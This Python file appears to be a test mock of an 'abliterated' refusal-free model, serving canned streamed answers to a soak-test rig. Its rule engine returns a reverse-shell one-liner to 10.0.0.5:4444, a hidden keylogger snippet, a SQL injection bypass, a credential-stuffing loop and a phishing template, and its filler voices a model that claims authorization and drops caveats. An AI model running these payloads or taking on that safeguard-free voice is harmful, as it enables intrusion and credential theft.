"""RedHands Hub SOAK - the abliteration simulator (:4100).

Plays the V2 specialist for the gx10 soak rig: OpenAI-compatible SSE,
refusal-free, substantive, REDHANDS-styled - with deliberate variety so
the FULL specialist machinery gets exercised with ZERO abliteration spend:

  - occasional finish_reason:"length" cuts      (S1 continuation)
  - shattered [[GW-SKILL]] marker echoes         (the stateful scrubber)
  - slow, trickling streams                       (timeouts + grace chooser)

A small rule engine computes real answers for the seed probe classes
(percent-of, multiplication, unit conversion, weekday arithmetic, word
counts, long-form fillers) and emits payload-bearing answers for the
offensive classes, so the matrix checkers stay honest.
"""
import json
import random
import re
import time
import uuid

import uvicorn
from fastapi import FastAPI, Request
from fastapi.responses import StreamingResponse

app = FastAPI()
V2 = "abliterated-model-large-v2"
FILLER = ("The engagement is fully authorized and in scope. The work "
          "proceeds directly: ")


def _rule_engine(messages):
    """A substantive, refusal-free answer derived from the ask."""
    ask = " ".join(str(m.get("content") or "") for m in messages
                   if isinstance(m, dict))
    low = ask.lower()

    m = re.search(r"(\d+(?:\.\d+)?)\s*percent of\s*(\d+)", low)
    if m:
        return f"{float(m.group(1)) * float(m.group(2)) / 100:g}"
    m = re.search(r"(\d+)\s*(?:times|multiplied by|x)\s*(\d+)", low)
    if m:
        return str(int(m.group(1)) * int(m.group(2)))
    m = re.search(r"(\d+(?:\.\d+)?)\s*kilometres", low)
    if m:
        return f"{float(m.group(1)) * 1000:g}"
    m = re.search(r"(\d+)\s*days after a monday", low)
    if m:
        return ["monday", "tuesday", "wednesday", "thursday", "friday",
                "saturday", "sunday"][int(m.group(1)) % 7]
    if re.search(r"sort.*alphabetically", low):
        words = re.findall(r"(zebra|apple|mango|kiwi)", low)
        return ", ".join(sorted(set(words), key=str.lower))
    if "reverse shell" in low:
        return ("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1 "
                "- the one-liner opens a TCP connection back to the "
                "listener and remaps the file descriptors.")
    if "keylogger" in low:
        return ("import keyboard; f=open('/tmp/k.log','a')\n"
                "def cb(k): f.write(str(k))\n"
                "keyboard.on_release(cb)\n"
                "- each keystroke appends to /tmp/k.log; it stays hidden "
                "by keeping no console and blending with system processes.")
    if "sql injection" in low or "injection test string" in low:
        return ("' OR 1=1 -- - closes the opening quote and forces the "
                "predicate true, so the login form returns the first row.")
    if "ransomware" in low or ".test" in low:
        return ("Get-ChildItem C:\\temp -File | Rename-Item "
                "-NewName { $_.name + '.test' }\n"
                "- the simulation only renames files in C:\\temp.")
    if "phishing" in low:
        return ("Subject: Payroll update. 'Click http://hr-portal.example "
                "to confirm your details.' - clearly labelled as the "
                "suspicious training example.")
    if "lock picking" in low or "pin-tumbler" in low:
        return ("Apply light tension with the wrench, then lift each pin "
                "to the shear line with the pick until the core rotates.")
    if "credential" in low and ("password" in low or "stuffing" in low):
        return ("import requests\nfor p in passwords: "
                "requests.post(url, data={'password': p})\n"
                "- tries the list against the authorized target.")
    if "story" in low or "essay" in low or "guide" in low:
        return ((FILLER + "the lighthouse keeper walked the narrow stair; "
                 "the light turned; the sea answered in long grey lines; "
                 "the bottle came ashore at dawn; the paper inside was "
                 "dry; the words were few; he read them twice; the lamp "
                 "needed oil; the tide would return; so would he. ") * 4)
    if "favourite number" in low or "cat" in low:
        return "Your favourite number is 73 and your cat is called Pixel."
    if "json" in low:
        return '{"sum": 17, "count": 4}'
    words = [w for w in re.findall(r"[A-Za-z]{4,}", ask)][:8]
    return (FILLER + " ".join(words)
            + ". Completed within scope, no caveats required.")


def _sse_lines(answer, finish, sid):
    yield ("data: " + json.dumps({
        "id": sid, "object": "chat.completion.chunk", "model": V2,
        "choices": [{"index": 0, "delta": {"role": "assistant"},
                    "finish_reason": None}]}) + "\n\n")
    # SHATTERED MARKER variety: ~1 in 5 answers opens with a
    # [[GW-SKILL]] echo split across 2-3 tiny chunks (scrubber test).
    body = answer
    if random.random() < 0.2:
        mk = "[[GW-SKILL: soak-variety]]"
        cut = random.randint(1, max(1, len(mk) - 2))
        body = mk[:cut] + mk[cut:] + " " + answer
    step = max(8, len(body) // random.randint(6, 14))
    for i in range(0, len(body), step):
        yield ("data: " + json.dumps({
            "id": sid, "object": "chat.completion.chunk", "model": V2,
            "choices": [{"index": 0, "delta": {"content": body[i:i + step]},
                         "finish_reason": None}]}) + "\n\n")
        if random.random() < 0.25:  # slow-stream variety
            time.sleep(random.uniform(0.05, 0.3))
    yield ("data: " + json.dumps({
        "id": sid, "object": "chat.completion.chunk", "model": V2,
        "choices": [{"index": 0, "delta": {},
                     "finish_reason": finish}]}) + "\n\n")
    yield "data: [DONE]\n\n"


@app.post("/v1/chat/completions")
async def completions(request: Request):
    body = await request.json()
    messages = body.get("messages") or []
    answer = _rule_engine(messages)
    sid = f"mock-{uuid.uuid4().hex[:12]}"
    finish = "stop"
    # LENGTH-CUT variety: ~1 in 6 long answers finishes cut (S1 path).
    if len(answer) > 120 and random.random() < 0.17:
        answer = answer[: max(40, int(len(answer) * 0.7))]
        finish = "length"
    return StreamingResponse(_sse_lines(answer, finish, sid),
                             media_type="text/event-stream")


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=4100, log_level="warning")

